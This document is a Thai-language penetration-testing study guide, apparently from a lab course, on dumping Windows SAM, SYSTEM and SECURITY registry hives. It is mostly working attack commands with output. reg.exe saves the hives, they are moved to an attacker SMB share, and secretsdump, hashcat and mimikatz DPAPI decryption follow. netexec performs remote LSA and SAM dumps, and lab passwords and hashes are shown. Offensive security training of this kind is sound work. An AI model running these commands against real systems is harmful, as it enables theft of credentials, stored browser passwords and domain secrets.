# การโจมตี SAM, SYSTEM และ SECURITY Registry Hives

## ภาพรวม

เมื่อเราได้สิทธิ์ Administrator บนระบบ Windows เราสามารถ dump ไฟล์ที่เกี่ยวข้องกับฐานข้อมูล SAM แล้วนำไปแคร็ก password hashes แบบ offline ได้ ข้อดีของการทำแบบ offline คือเราไม่ต้องคง session กับเครื่อง target ไว้ตลอด

---

## Registry Hives ที่สำคัญ

มี 3 Registry Hives หลักที่ต้องสำรองสำเนา:

| Registry Hive | คำอธิบาย |
|---------------|----------|
| **HKLM\SAM** | เก็บ password hashes ของ local user accounts ที่สามารถ extract และแคร็กเพื่อได้ plaintext passwords |
| **HKLM\SYSTEM** | เก็บ system boot key ที่ใช้เข้ารหัสฐานข้อมูล SAM (จำเป็นในการถอดรหัส hashes) |
| **HKLM\SECURITY** | เก็บข้อมูลที่ละเอียดอ่อนของ Local Security Authority (LSA) รวมถึง cached domain credentials (DCC2), cleartext passwords, DPAPI keys และอื่นๆ |

### หมายเหตุสำคัญ
- ถ้าต้องการเฉพาะ hashes ของ local users: ต้องใช้แค่ **SAM** และ **SYSTEM**
- แนะนำให้สำรอง **SECURITY** ด้วย เพราะอาจมี cached domain credentials และข้อมูลสำคัญอื่นๆ

---

## ขั้นตอนการโจมตี

### 1. การสำรองสำเนา Registry Hives

ใช้ `reg.exe` บน cmd.exe ที่มีสิทธิ์ Administrator:

```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
The operation completed successfully.
```

### 2. การถ่ายโอนไฟล์ไปยังเครื่อง Attacker

#### 2.1 สร้าง SMB Share บนเครื่อง Attacker

ใช้ Impacket's smbserver:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

**พารามิเตอร์:**
- `-smb2support`: รองรับ SMB version 2 (จำเป็นสำหรับ Windows รุ่นใหม่)
- `CompData`: ชื่อ share
- `/home/ltnbob/Documents/`: directory ปลายทางบนเครื่อง attacker

#### 2.2 ย้ายไฟล์จากเครื่อง Target

บนเครื่อง Windows target:

```cmd
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

#### 2.3 ตรวจสอบไฟล์

```bash
ls
# Output: sam.save  security.save  system.save
```

---

## 3. การ Dump Hashes ด้วย secretsdump

### 3.1 ตรวจสอบว่ามี Impacket หรือไม่

```bash
locate secretsdump
```

### 3.2 รัน secretsdump

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### 3.3 ผลลัพธ์

```
[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::

[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM 
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
```

### การตีความผลลัพธ์

**รูปแบบ:** `username:uid:lmhash:nthash`

- **LM Hash**: ใช้กับ Windows รุ่นเก่า (ก่อน Vista/Server 2008) - แคร็กง่ายกว่า
- **NT Hash**: ใช้กับ Windows รุ่นใหม่ - เป็นเป้าหมายหลักในการแคร็ก
- **Boot Key**: จำเป็นในการถอดรหัส SAM database

---

## 4. การแคร็ก Hashes ด้วย Hashcat

### 4.1 เตรียมไฟล์ Hashes

สร้างไฟล์ text เก็บ NT hashes:

```bash
sudo vim hashestocrack.txt
```

```
64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

### 4.2 รัน Hashcat

**คำสั่ง:**

```bash
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

**พารามิเตอร์:**
- `-m 1000`: ระบุ hash type เป็น NT/NTLM
- `hashestocrack.txt`: ไฟล์ที่เก็บ hashes
- `/usr/share/wordlists/rockyou.txt`: wordlist สำหรับแคร็ก

### 4.3 ผลลัพธ์

```
Dictionary cache hit:
* Passwords.: 14344385
* Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                

Status...........: Cracked
Hash.Name........: NTLM
Recovered........: 5/5 (100.00%) Digests
```

---

## 5. DCC2 Hashes (Domain Cached Credentials)

### ความหมาย
DCC2 เป็น hashed copies ของ network credentials ที่ cache ไว้ในเครื่อง domain-joined

### ตัวอย่าง Hash

```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

### คุณสมบัติ
- ใช้ PBKDF2 ทำให้แคร็กยากกว่า NT hash มาก
- **ไม่สามารถใช้กับ Pass-the-Hash ได้**
- Hashcat mode: **2100**

### การแคร็ก DCC2

```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

### เปรียบเทียบความเร็ว

| Hash Type | ความเร็ว | สัดส่วน |
|-----------|----------|---------|
| **NTLM** | 4,605,400 H/s | 1x (base) |
| **DCC2** | 5,536 H/s | **~800x ช้ากว่า** |

**สรุป:** Password ที่แข็งแรงมักจะแคร็กไม่ได้ภายในระยะเวลาของการทดสอบ Penetration Testing ปกติ

---

## 6. DPAPI (Data Protection API)

### คำอธิบาย
DPAPI เป็น API ชุดหนึ่งใน Windows ที่ใช้เข้ารหัสและถอดรหัสข้อมูลแบบ per-user basis

### แอปพลิเคชันที่ใช้ DPAPI

| แอปพลิเคชัน | การใช้งาน DPAPI |
|-------------|------------------|
| **Internet Explorer** | ข้อมูล auto-completion ของ password (username/password) |
| **Google Chrome** | ข้อมูล auto-completion ของ password |
| **Outlook** | Passwords สำหรับ email accounts |
| **Remote Desktop Connection** | Saved credentials สำหรับเชื่อมต่อเครื่อง remote |
| **Credential Manager** | Saved credentials สำหรับ shared resources, Wireless networks, VPNs |

### การถอดรหัส DPAPI

**Tools:**
- Impacket's dpapi
- mimikatz
- DonPAPI (remote)

**ตัวอย่างการใช้ mimikatz:**

```cmd
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect

> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/
Username: bob
Password: April2025!
```

---

## 7. Remote Dumping

### 7.1 Dumping LSA Secrets แบบ Remote

ใช้ netexec (หรือ crackmapexec) กับ credentials ที่มีสิทธิ์ local admin:

```bash
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

**ผลลัพธ์:**

```
SMB    10.129.42.198   445    WS01    [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB    10.129.42.198   445    WS01    [+] Dumping LSA secrets
SMB    10.129.42.198   445    WS01    WS01\worker:Hello123
SMB    10.129.42.198   445    WS01    dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
SMB    10.129.42.198   445    WS01    dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
```

### 7.2 Dumping SAM แบบ Remote

```bash
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

**ผลลัพธ์:**

```
SMB    10.129.42.198   445    WS01    [+] Dumping SAM hashes
SMB    10.129.42.198   445    WS01    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB    10.129.42.198   445    WS01    bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB    10.129.42.198   445    WS01    sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB    10.129.42.198   445    WS01    [+] Added 8 SAM hashes to the database
```

---

คำสั่ง `--lsa` จะ **dump LSA Secrets** ออกมา ซึ่งอาจได้หลายอย่างขึ้นอยู่กับการ config ของเครื่อง Windows นั้นๆ





## สิ่งที่อาจได้จาก `--lsa`:

### 🔑 **1. Service Account Credentials (Plaintext)**
```bash
SMB  10.129.120.230  445  FRONTDESK01  _SC_MSSQLSERVER
                                       SA:MyPassword123!
```
**Services ที่มักเก็บ credentials:**
- SQL Server service accounts
- IIS Application Pool identities
- Custom Windows services
- Backup services
- Monitoring agents

---

### 🔑 **2. Scheduled Task Credentials (Plaintext)**
```bash
SMB  10.129.120.230  445  FRONTDESK01  ASPNET_WP
                                       backupuser:Backup2023!
```
**Tasks ที่เก็บ credentials:**
- Backup tasks
- Maintenance scripts
- Domain sync tasks
- Custom automation

---

### 🔑 **3. Auto-logon Credentials (Plaintext)**
```bash
SMB  10.129.120.230  445  FRONTDESK01  DefaultPassword
                                       kiosk:Kiosk123!
```
**พบใน:**
- Kiosk machines
- Digital signage
- Public terminals
- Development machines

---

### 🔑 **4. DPAPI Master Keys**
```bash
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
```
**ใช้ decrypt:**
- Browser saved passwords (Chrome, Edge, Firefox)
- Windows Credential Manager
- RDP saved credentials
- WiFi passwords
- VPN credentials
- Outlook passwords
- Certificate private keys

---

### 🔑 **5. Domain Computer Account Password**
```bash
$MACHINE.ACC:aad3b435b51404eeaad3b435b51404ee:8a72b4[...]
```
**ใช้สำหรับ:**
- Domain authentication
- Kerberos ticket requests
- Domain trust relationships

---

### 🔑 **6. Domain Cached Credentials Key (NL$KM)**
```bash
NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb...
```
**ใช้:**
- Decrypt cached domain credentials (DCC2)
- ใช้กับ users ที่เคย login แบบ domain
- อยู่ใน `HKLM\SECURITY\Cache`

---

### 🔑 **7. VPN/Dial-up Credentials**
```bash
RASAUTODIAL:username:vpnpassword123
```

---

### 🔑 **8. Custom Application Secrets**
```bash
CustomApp_DBPassword:DbAdmin:SecretPass!
```

---

---

## เปรียบเทียบกับคำสั่งอื่น:

| คำสั่ง | ได้อะไร | Format |
|--------|---------|--------|
| `--sam` | Local user hashes | NTLM hashes |
| `--lsa` | LSA Secrets | Plaintext + Keys |
| `--ntds` | Domain user hashes | NTLM hashes |
| `--dpapi` | DPAPI credentials | Decrypted passwords |

---

## สรุป - จาก `--lsa` จะได้:

✅ **แน่นอนที่จะได้:**
1. DPAPI master keys (machinekey + userkey)
2. ข้อมูลที่เข้ารหัสใน LSA Secrets

✅ **อาจจะได้ (ถ้ามี):**
1. Service account plaintext passwords
2. Scheduled task credentials
3. Auto-logon passwords
4. VPN/RAS credentials
5. NL$KM (domain cached creds key)
6. Machine account hash
7. Custom application secrets

